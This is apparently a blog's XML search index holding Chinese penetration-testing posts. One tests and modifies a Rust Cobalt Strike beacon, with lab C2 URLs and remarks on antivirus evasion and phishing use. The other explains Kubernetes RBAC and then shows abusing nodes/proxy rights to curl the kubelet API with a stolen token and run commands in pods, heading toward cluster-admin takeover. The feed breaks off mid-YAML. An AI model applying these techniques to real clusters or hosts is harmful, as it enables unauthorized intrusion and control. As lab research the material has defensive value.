<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>cobaltstrike-beacon-rust测试与修改</title>
      <link href="/posts/19d1f7ce/"/>
      <url>/posts/19d1f7ce/</url>
      
        <content type="html"><![CDATA[<p>github 看到大佬 star 了一个rust项目<a href="https://github.com/b1tg/cobaltstrike-beacon-rust/">cobaltstrike-beacon-rust</a>，该项目是直接使用 rust 编写了 cs 的 beacon。</p><h1 id="获取-C2-信息"><a href="#获取-C2-信息" class="headerlink" title="获取 C2  信息"></a>获取 C2  信息</h1><p>这里为了方便直接使用默认的 cs 进行测试，如果使用自己修改过的 cs 可根据相关资料或者配置文件获得基本的 CS信息。<br><img src="https://s2.loli.net/2023/05/12/wU8kvpWuxDAz9Vb.png" alt="image.png"><br>作者这里已经在<code>generate_config.py</code>文件种写好了默认的信息，只需要将<code>BEACON_KEYS_PATH</code>设置一下就好，默认在 cs 目录下。<br><img src="https://s2.loli.net/2023/05/12/tCRZYIcvD27sxg4.png" alt="image.png"></p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>直接使用作者脚本内的默认信息，将 ip 修改成 cs 的就好</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C2_GET_URL = <span class="string">&quot;http://192.168.1.106:8080/fwlink&quot;</span></span><br><span class="line">C2_POST_URL = <span class="string">&quot;http://192.168.1.106:8080/submit.php?id=&quot;</span></span><br><span class="line">USER_AGENT = <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; Avant Browser)&quot;</span></span><br><span class="line">BEACON_KEYS_PATH = <span class="string">&quot;.cobaltstrike.beacon_keys&quot;</span></span><br></pre></td></tr></table></figure><p>运行直接上线，不用再借助插件之类的<br><img src="https://s2.loli.net/2023/05/12/YHrJmMOsIW3a7bo.png" alt="image.png"><br>尝试执行命令，成功返回<br><img src="https://s2.loli.net/2023/05/12/gB52Fceb7KjYNyM.png" alt="image.png"><br>运行会看到详细信息。<br><img src="https://s2.loli.net/2023/05/12/r3ntXxag8iJz6F5.png" alt="image.png"></p><h1 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h1><p>重复上面操作，直接运行，mac 直接上线<br><img src="https://s2.loli.net/2023/05/12/lyRaqK1B2XU3iHv.png" alt="image.png"></p><p>和 linux一样只有执行命令的功能<br><img src="https://s2.loli.net/2023/05/12/OjonqTIWESCUazH.png" alt="image.png"></p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>这里在 win10 上运行测试失败，报错如下<br><img src="https://s2.loli.net/2023/05/12/Q1RbSoZjDXIuHOJ.png" alt="image.png"><br>查看一下代码，作者目前只是对Linux 和 Unix 情况做了判断，对 Windows 还没有<br><img src="https://s2.loli.net/2023/05/12/ksWTyPQoG5wANfM.png" alt="image.png"></p><p>这边我自己对代码进行了修改，实现 Windows 上线的功能，至此全平台上线实现。<br><img src="https://s2.loli.net/2023/05/12/9tiLF4yU7E6zTkZ.png" alt="image.png"><br>由于是虚拟机内网 ip 获取还有些问题，有待改进。<br><img src="https://s2.loli.net/2023/05/12/Ah9JwulTQ1gjMne.png" alt="image.png"><br>修改后的项目地址：</p><ul><li><a href="https://github.com/808Mak1r/cobaltstrike-beacon-rust">https://github.com/808Mak1r/cobaltstrike-beacon-rust</a></li></ul><p>已经提交 <a href="https://github.com/b1tg/cobaltstrike-beacon-rust/pull/3">PR</a> 等待作者合并。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>该项目研究意义还是很大的，继续完善可以实现全平台的直接上线，而且是直接使用 rust 编写的对于免杀效果应该也是非常好的。<br>对于钓鱼场景还是可以考虑使用，就是 mac 可能麻烦点应该还是得制作 DMG、PKG等安装包。</p>]]></content>
      
      
      <categories>
          
          <category> 后渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
            <tag> 持久化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>K8S API访问控制之RBAC利用</title>
      <link href="/posts/836b7920/"/>
      <url>/posts/836b7920/</url>
      
        <content type="html"><![CDATA[<h1 id="API访问控制"><a href="#API访问控制" class="headerlink" title="API访问控制"></a>API访问控制</h1><p>K8S的API访问控制就是，通过如<code>kubectl</code>、构造REST请求，去访问Kubernetes的API，当请求到达API时经历的多个阶段就是k8s的API访问控制，而RBAC就是其中鉴权的部分，并且是现在的主要方式，kubeadm安装的集群从1.6版本以后都默认开启了RBAC和Node的鉴权方式。<br><img src="https://s2.loli.net/2023/01/16/qa3SlYLugRETrem.png" alt="image.png"></p><h1 id="RBAC-基于角色的访问控制"><a href="#RBAC-基于角色的访问控制" class="headerlink" title="RBAC-基于角色的访问控制"></a>RBAC-基于角色的访问控制</h1><p><a href="https://kubernetes.io/docs/reference/access-authn-authz/rbac/">RBAC</a>就是基于角色（Role）的访问控制，是一种基于组织中用户的角色来调节控制对计算机或网络资源的访问的方法。<br>RBAC 鉴权机制使用<code>rbac.authorization.k8s.io</code> <a href="https://kubernetes.io/docs/concepts/overview/kubernetes-api/#api-groups-and-versioning">API 组</a>来驱动鉴权决定， 允许通过 Kubernetes API 动态配置策略。<br>要启用 RBAC，在启动 API 服务器时将<code>--authorization-mode</code>参数设置为一个逗号分隔的列表并确保其中包含 RBAC。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kube-apiserver --authorization-mode=Node,RBAC --&lt;其他选项&gt; --&lt;其他选项&gt;</span><br></pre></td></tr></table></figure><h1 id="API对象"><a href="#API对象" class="headerlink" title="API对象"></a>API对象</h1><p>RBAC API 声明了四种 Kubernetes 对象：Role、ClusterRole、RoleBinding 和 ClusterRoleBinding。</p><h2 id="Role和ClusterRole"><a href="#Role和ClusterRole" class="headerlink" title="Role和ClusterRole"></a>Role和ClusterRole</h2><p>RBAC 的 Role 或 ClusterRole 中包含一组代表相关权限的规则。 这些权限是纯粹累加的（不存在拒绝某操作的规则）。<br>如果你希望在名字空间内定义角色，应该使用 Role； 如果你希望定义集群范围的角色，应该使用 ClusterRole。<br>Role 或 ClusterRole 对象的名称必须是合法的<a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/names#path-segment-names">路径分段名称</a>。</p><h3 id="Role"><a href="#Role" class="headerlink" title="Role"></a>Role</h3><p>Role主要用来设置命名空间的访问权限，在创建时必须指定<code>namespace</code>。<br>下面是一个位于 “default” 命名空间的 Role 的示例，可用来授予对 <a href="https://kubernetes.io/docs/concepts/workloads/pods/">Pod</a> 的读访问权限：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-reader</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>] <span class="comment"># &quot;&quot; 标明 core API 组</span></span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;pods&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;list&quot;</span>]</span><br></pre></td></tr></table></figure><h3 id="ClusterRole"><a href="#ClusterRole" class="headerlink" title="ClusterRole"></a>ClusterRole</h3><p>ClusterRole 则是一个集群作用域的资源。这两种资源的名字不同（Role 和 ClusterRole） 是因为 Kubernetes 对象要么是名字空间作用域的，要么是集群作用域的，不可两者兼具。</p><p>ClusterRole 有若干用法。你可以用它来：</p><ol><li>定义对某名字空间域对象的访问权限，并将在个别名字空间内被授予访问权限；</li><li>为名字空间作用域的对象设置访问权限，并被授予跨所有名字空间的访问权限；</li><li>为集群作用域的资源定义访问权限。</li></ol><p>ClusterRole 同样可以用于授予 Role 能够授予的权限。 因为 ClusterRole 属于集群范围，所以它也可以为以下资源授予访问权限：</p><ul><li>集群范围资源（比如<a href="https://kubernetes.io/docs/concepts/architecture/nodes/">节点（Node）</a>）</li><li>非资源端点（比如 <code>/healthz</code>）</li><li>跨名字空间访问的名字空间作用域的资源（如 Pod）比如，你可以使用 ClusterRole 来允许某特定用户执行 <code>kubectl get pods --all-namespaces</code></li></ul><p>下面是一个 ClusterRole 的示例，可用来为任一特定名字空间中的 <a href="https://kubernetes.io/docs/concepts/configuration/secret/">Secret</a> 授予读访问权限， 或者跨名字空间的访问权限：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="comment"># &quot;namespace&quot; 被忽略，因为 ClusterRoles 不受名字空间限制</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">secret-reader</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line"><span class="comment"># 在 HTTP 层面，用来访问 Secret 资源的名称为 &quot;secrets&quot;</span></span><br><span class="line"><span class="attr">resources:</span> [<span class="string">&quot;secrets&quot;</span>]</span><br><span class="line"><span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;list&quot;</span>]</span><br></pre></td></tr></table></figure><h2 id="RoleBinding和CluserRoleBinding"><a href="#RoleBinding和CluserRoleBinding" class="headerlink" title="RoleBinding和CluserRoleBinding"></a>RoleBinding和CluserRoleBinding</h2><p>角色绑定（Role Binding）是将角色中定义的权限赋予一个或者一组用户。 它包含若干 主体（用户、组或服务账户）的列表和对这些主体所获得的角色的引用。 RoleBinding 在指定的名字空间中执行授权，而 ClusterRoleBinding 在集群范围执行授权。<br>RoleBinding 或 ClusterRoleBinding 对象的名称必须是合法的路径分段名称。</p><h3 id="RoleBinding"><a href="#RoleBinding" class="headerlink" title="RoleBinding"></a>RoleBinding</h3><p>一个 RoleBinding 可以引用同一的名字空间中的任何 Role。 或者，一个 RoleBinding 可以引用某 ClusterRole 并将该 ClusterRole 绑定到 RoleBinding 所在的名字空间。<br>下面的例子中的 RoleBinding 将 “pod-reader” Role 授予在 “default” 名字空间中的用户 “jane”。 这样，用户 “jane” 就具有了读取 “default” 名字空间中所有 Pod 的权限。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="comment"># 此角色绑定允许 &quot;jane&quot; 读取 &quot;default&quot; 名字空间中的 Pod</span></span><br><span class="line"><span class="comment"># 你需要在该命名空间中有一个名为 “pod-reader” 的 Role</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">read-pods</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="comment"># 你可以指定不止一个“subject（主体）”</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">jane</span> <span class="comment"># &quot;name&quot; 是区分大小写的</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="comment"># &quot;roleRef&quot; 指定与某 Role 或 ClusterRole 的绑定关系</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span>        <span class="comment"># 此字段必须是 Role 或 ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-reader</span>  <span class="comment"># 此字段必须与你要绑定的 Role 或 ClusterRole 的名称匹配</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><p>RoleBinding 也可以引用 ClusterRole，以将对应 ClusterRole 中定义的访问权限授予 RoleBinding 所在名字空间的资源。这种引用使得你可以跨整个集群定义一组通用的角色， 之后在多个名字空间中复用。<br>例如，尽管下面的 RoleBinding 引用的是一个 ClusterRole，”dave”（这里的主体， 区分大小写）只能访问 “development” 名字空间中的 Secrets 对象，因为 RoleBinding 所在的名字空间（由其 metadata 决定）是 “development”。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="comment"># 此角色绑定使得用户 &quot;dave&quot; 能够读取 &quot;development&quot; 名字空间中的 Secrets</span></span><br><span class="line"><span class="comment"># 你需要一个名为 &quot;secret-reader&quot; 的 ClusterRole</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">read-secrets</span></span><br><span class="line">  <span class="comment"># RoleBinding 的名字空间决定了访问权限的授予范围。</span></span><br><span class="line">  <span class="comment"># 这里隐含授权仅在 &quot;development&quot; 名字空间内的访问权限。</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">development</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">dave</span> <span class="comment"># &#x27;name&#x27; 是区分大小写的</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-reader</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><h3 id="ClusterRoleBinding"><a href="#ClusterRoleBinding" class="headerlink" title="ClusterRoleBinding"></a>ClusterRoleBinding</h3><p>如果希望ClusterRole绑定到集群的所有命名空间，需要使用ClusterRoleBinding<br>要跨整个集群完成访问权限的授予，你可以使用一个 ClusterRoleBinding。 下面的 ClusterRoleBinding 允许 “manager” 组内的所有用户访问任何名字空间中的 Secret。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="comment"># 此集群角色绑定允许 “manager” 组中的任何人访问任何名字空间中的 Secret 资源</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">read-secrets-global</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">Group</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">manager</span>      <span class="comment"># &#x27;name&#x27; 是区分大小写的</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-reader</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><p>创建了绑定之后，你不能再修改绑定对象所引用的 Role 或 ClusterRole。 试图改变绑定对象的 roleRef 将导致合法性检查错误。 如果你想要改变现有绑定对象中 roleRef 字段的内容，必须删除重新创建绑定对象。<br>这种限制有两个主要原因：</p><ol><li>将 roleRef 设置为不可以改变，这使得可以为用户授予对现有绑定对象的 update 权限， 这样可以让他们管理主体列表，同时不能更改被授予这些主体的角色。</li><li>针对不同角色的绑定是完全不一样的绑定。要求通过删除&#x2F;重建绑定来更改 roleRef， 这样可以确保要赋予绑定的所有主体会被授予新的角色（而不是在允许或者不小心修改了 roleRef 的情况下导致所有现有主体未经验证即被授予新角色对应的权限）。</li></ol><p>命令 kubectl auth reconcile 可以创建或者更新包含 RBAC 对象的清单文件， 并且在必要的情况下删除和重新创建绑定对象，以改变所引用的角色。</p><h1 id="Nodes-proxy"><a href="#Nodes-proxy" class="headerlink" title="Nodes&#x2F;proxy"></a>Nodes&#x2F;proxy</h1><p>在k8s集群中，每个节点上10250端口是每个节点的kubelet开启的，主要用来接收<code>kube-apiserver</code>发送的api然后在节点上执行相关操作。<br>当RBAC配置为对资源为<code>nodes/proxy</code>，verbs包含<code>&quot;get&quot; &quot;create&quot;</code>时就可以绕过<code>apiserver</code>直接对每个节点操作，当知道每个节点ip时，相当于获得了集群的每个节点的权限。<br>首先创建需要的相关资源</p><ul><li>ServiceAccount</li><li>Secret</li><li>ClusterRole</li><li>ClusterRoleBinding</li></ul><ol><li><p>创建服务账户用来将<code>ClusterRoleBinding</code>角色绑定。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nodeproxy</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br></pre></td></tr></table></figure></li><li><p>手动创建服务账户的<code>Secret</code>自动生成<code>Token</code></p><blockquote><p>令牌控制器将清理不存在的服务账号的所有令牌。</p></blockquote></li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nodeproxy-token</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">kubernetes.io/service-account.name:</span> <span class="string">nodeproxy</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">kubernetes.io/service-account-token</span></span><br></pre></td></tr></table></figure><ol start="3"><li><p>创建集群角色，并授予对<code>nodes/proxy</code>资源的权限</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nodeproxy</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;nodes/proxy&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;create&quot;</span>]</span><br></pre></td></tr></table></figure></li><li><p>创建<code>ClusterRoleBinding</code>将集群角色中定义的权限赋予之前创建的服务账户。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nodeproxybinding</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nodeproxy</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nodeproxy</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure></li></ol><p>资源创建过程完成后，测试利用如下</p><ol><li><p>获取刚才创建的服务账户的token</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get secrets build-nodeproxy -o jsonpath=&#123;.data.token&#125; | <span class="built_in">base64</span> -d</span><br><span class="line">eyJhbGciOiJSUzI1NiIsImtpZCI6IkpBS09mWHo0cU55bWI3NVV6cW4yQVV2MXFaUTJRX2tualZqeV9PbDVIOFEifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImJ1aWxkLW5vZGVwcm94eSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJub2RlcHJveHkiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJkYzU1ODc4YS0xM2ZiLTRiZjUtODFiMy0xNGI4NjczOGI1YjIiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDpub2RlcHJveHkifQ.DGUoIpe6-kNiUQW0USApR6kwLhiuVIYuHdwYRWdHArqYEEhcG8WNMNOAK-cMu0i9v69xplNLAwWFFIjjOsWtgrKzOih8M39Wyfgmha9_D9YqOJCPLwLRAuxlBPXGmkM_hEcEQ7ockh5a9GGRS5Q3E45KhofZR44QqlaDyoYyxUd7M8m4-Kss_m7otNyh39Q6dDug5dOBIcV1Tk6hPye3XqPAGQ0y_nAtZY9k2GZENeODzwYiEW1LOJ9bJbJI62Qo_rvPB6CFYRt4TnQFsrPwFhfQKeIOIKowoqfz1rBmYCSNrBAkdVbQ-ZvmkAsOz704l6oati_K6Pq_q3VL-Zgb2A</span><br></pre></td></tr></table></figure></li><li><p>使用curl或者任意可以发送api的工具查看pods并将token放进header的<code>Authorization</code>中，可以通过<code>jless</code>过滤json查看获取信息：</p></li></ol><ul><li>namespace</li><li>pod-name</li><li>container-name<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -k -H <span class="string">&quot;Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IkpBS09mWHo0cU55bWI3NVV6cW4yQVV2MXFaUTJRX2tualZqeV9PbDVIOFEifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImJ1aWxkLW5vZGVwcm94eSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJub2RlcHJveHkiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJkYzU1ODc4YS0xM2ZiLTRiZjUtODFiMy0xNGI4NjczOGI1YjIiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDpub2RlcHJveHkifQ.DGUoIpe6-kNiUQW0USApR6kwLhiuVIYuHdwYRWdHArqYEEhcG8WNMNOAK-cMu0i9v69xplNLAwWFFIjjOsWtgrKzOih8M39Wyfgmha9_D9YqOJCPLwLRAuxlBPXGmkM_hEcEQ7ockh5a9GGRS5Q3E45KhofZR44QqlaDyoYyxUd7M8m4-Kss_m7otNyh39Q6dDug5dOBIcV1Tk6hPye3XqPAGQ0y_nAtZY9k2GZENeODzwYiEW1LOJ9bJbJI62Qo_rvPB6CFYRt4TnQFsrPwFhfQKeIOIKowoqfz1rBmYCSNrBAkdVbQ-ZvmkAsOz704l6oati_K6Pq_q3VL-Zgb2A&quot;</span> https://192.168.56.10:10250/pods | jless</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2023/01/16/Y6qm2IP3gBi1ZwC.png" alt="image.png"></li></ul><ol start="3"><li>根据获取到的信息通过<code>https://ip:10250/run/namespace/pod-name/container-name</code>api执行命令</li></ol><p><img src="https://s2.loli.net/2023/01/16/6NmsO3ErFK41TvV.png" alt="image.png"><br>后面的流程可以通过信息收集获得master的ip，然后找到kube-proxy，反弹shell然后逃逸获得master主机权限，从而获得<code>cluster admin</code>权限。</p><h1 id="列举Secret"><a href="#列举Secret" class="headerlink" title="列举Secret"></a>列举Secret</h1><p>当RBAC允许对Secrets执行的verb包括get、list、watch的情况下，被授权用户可以获取Secret的具体内容，不同的主体可能不同，或者是Role或者ClusterRole的也不同。<br>首先测试Role，相关资源创建：</p><ul><li>ServiceAccount</li><li>Secret</li><li>Role</li><li>RoleBinding<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-list-sa</span></span><br><span class="line"><span class="attr">automountServiceAccountToken:</span> <span class="literal">true</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-list-build</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">kubernetes.io/service-account.name:</span> <span class="string">secret-list-sa</span></span><br><span class="line"><span class="attr">type:</span> <span 